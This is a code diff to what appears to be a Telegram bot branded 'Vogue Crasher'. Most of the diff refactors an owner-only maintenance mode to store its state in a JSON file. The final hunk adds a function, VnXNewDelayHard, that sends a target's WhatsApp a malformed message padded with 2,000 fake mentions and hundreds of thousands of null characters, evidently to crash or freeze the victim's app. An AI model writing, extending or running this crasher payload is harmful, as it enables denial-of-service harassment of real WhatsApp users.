@@ -274,6 +274,8 @@ let spamQueue = [];
 let queueRunning = false;
 const queueFile = "./database/spamQueue.json";
 const LOG_QUEUE_CHANNEL_ID = "@LogVagues";
+const MAINTENANCE_FILE =
+    "./database/maintenance.json";
 const TASK_DURATION =
     (30 * 3000) + (3 * 60 * 1000);
 
@@ -2096,149 +2098,137 @@ for command execution.
 //                                                           
 //                                                           
 
-let maintenanceMode = false;
 
-const maintenanceMessage = `
-\`\`\`ruby
-V O G U E  •  C R A S H E R
-──────────────────────────
-
-SYSTEM MAINTENANCE
-
-Status      : Unavailable
-Engine      : Updating
-Access      : Restricted
-
-──────────────────────────
-The system is currently under maintenance.
-
-Please wait until the maintenance
-process has been completed.
-\`\`\``;
-
-
-bot.use(async (ctx, next) => {
+if (
+    !fs.existsSync(
+        MAINTENANCE_FILE
+    )
+) {
     
-    if (ctx.from?.id == ownerID) {
+    fs.writeFileSync(
+        MAINTENANCE_FILE,
+        JSON.stringify({
+            enabled: false
+        }, null, 4)
+    );
+}
+
+function getMaintenanceStatus() {
+    try {
+        
+        const data =
+            JSON.parse(
+                fs.readFileSync(
+                    MAINTENANCE_FILE,
+                    "utf8"
+                )
+            );
+        
+        return data.enabled || false;
+        
+    } catch {
+        
+        return false;
+    }
+}
+
+function setMaintenanceStatus(status) {
+    
+    fs.writeFileSync(
+        MAINTENANCE_FILE,
+        JSON.stringify({
+            enabled: status
+        }, null, 4)
+    );
+}
+
+async function checkMaintenance(ctx, next) {
+    const maintenance =
+        getMaintenanceStatus();
+    
+    
+    if (
+        ctx.from.id == ownerID
+    ) {
+        
         return next();
     }
     
-    if (maintenanceMode) {
+    if (maintenance) {
         
-        if (ctx.callbackQuery) {
-            return ctx.answerCbQuery(
-                "System under maintenance.",
-                {
-                    show_alert: true
-                }
-            );
-        }
-        
-        return ctx.replyWithPhoto(
-            thumbnailUrl,
+        return ctx.reply(
+            `\`\`\`ruby
+V O G U E • S Y S T E M
+────────────────────────
+
+SYSTEM MAINTENANCE
+
+The service is temporarily unavailable due to system maintenance.
+
+Please try again later.
+
+────────────────────────
+\`\`\``,
             {
-                caption: maintenanceMessage,
-                parse_mode: "markdown",
-                
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                        {
-                            text: "Developer",
-                            url: "https://t.me/ScriptKits",
-                            style: "danger"
-                        }],
-                        [
-                        {
-                            text: "System Status",
-                            callback_data: "maintenance_status",
-                            style: "danger"
-                        }]
-                    ]
-                }
+                parse_mode: "Markdown"
             }
         );
     }
     
     return next();
-});
+}
 
-bot.action(
-    "maintenance_status",
-    async (ctx) => {
-        
-        return ctx.answerCbQuery(
-            "Maintenance currently active.",
-            {
-                show_alert: true
-            }
-        );
-    }
-);
-
-bot.command(
-    "maintenance",
-    async (ctx) => {
-        
-        if (ctx.from.id != ownerID) {
+bot.command("maintenance", async (ctx) => {
+        if (
+            ctx.from.id != ownerID
+        ) {
+            
             return;
         }
         
-        maintenanceMode = true;
+        setMaintenanceStatus(
+            true
+        );
         
-        return ctx.reply(
+        ctx.reply(
             `\`\`\`ruby
-V O G U E  •  C R A S H E R
-──────────────────────────
+VOGUE SYSTEM
 
-MAINTENANCE ENABLED
-
-Status      : Active
-Access      : Owner Only
-
-──────────────────────────
-Public access has been disabled.
+Maintenance Mode:
+ENABLED
 \`\`\``,
             {
-                parse_mode: "markdown"
+                parse_mode: "Markdown"
             }
         );
-    }
-);
+    });
 
-bot.command(
-    "unmaintenance",
-    async (ctx) => {
-        
-        if (ctx.from.id != ownerID) {
+bot.command("unmaintenance", async (ctx) => {
+        if (
+            ctx.from.id != ownerID
+        ) {
+            
             return;
         }
         
-        maintenanceMode = false;
+        setMaintenanceStatus(
+            false
+        );
         
-        return ctx.reply(
+        ctx.reply(
             `\`\`\`ruby
-V O G U E  •  C R A S H E R
-──────────────────────────
+VOGUE SYSTEM
 
-MAINTENANCE DISABLED
-
-Status      : Online
-Access      : Public Restored
-
-──────────────────────────
-System access has been restored.
+Maintenance Mode:
+DISABLED
 \`\`\``,
             {
-                parse_mode: "markdown"
+                parse_mode: "Markdown"
             }
         );
-    }
-);
+    });
 
-bot.command(
-    "setcd",
-    async (ctx) => {
+bot.command("setcd", async (ctx) => {
 
         if (
             String(ctx.from.id) !==
@@ -2292,8 +2282,7 @@ Status   : Active
     parse_mode: "Markdown"
 }
         );
-    }
-);
+    });
 
 //    ____________ ________  ________ _   ____  ___   
 //    | ___ \ ___ \  ___|  \/  |_   _| | | |  \/  |   
@@ -5550,6 +5539,47 @@ async function VogueBuldo(sock, target) {
   }
   await sleep(1500)
 }
+}
+
+async function VnXNewDelayHard(sock, target) {
+  const vnxmbgdly = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveResponseMessage: {
+          contextInfo: {
+            participant: target,
+            mentionedJid: [
+              '0@s.whatsapp.net',
+              ...Array.from(
+                {
+                  length: 2000,
+                },
+                () =>
+                  '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
+              ),
+            ],
+            body: {
+              text: 'VnX',
+              format: 'DEFAULT',
+            },
+            footer: {
+              text: '\u0000'.repeat(25000),
+              format: 'DEFAULT',
+            },
+            nativeFlowResponseMessage: {
+              name: 'galaxy_message',
+              paramsJson: `{\"flow_cta\":{\"title\":${"\u0000".repeat(990000)}}}`,
+              version: 3,
+             },
+           },
+         },
+       },
+     },
+   };
+
+  await sock.relayMessage(target, vnxmbgdly, {
+    participant: { jid: target },
+  });
 }
 
 
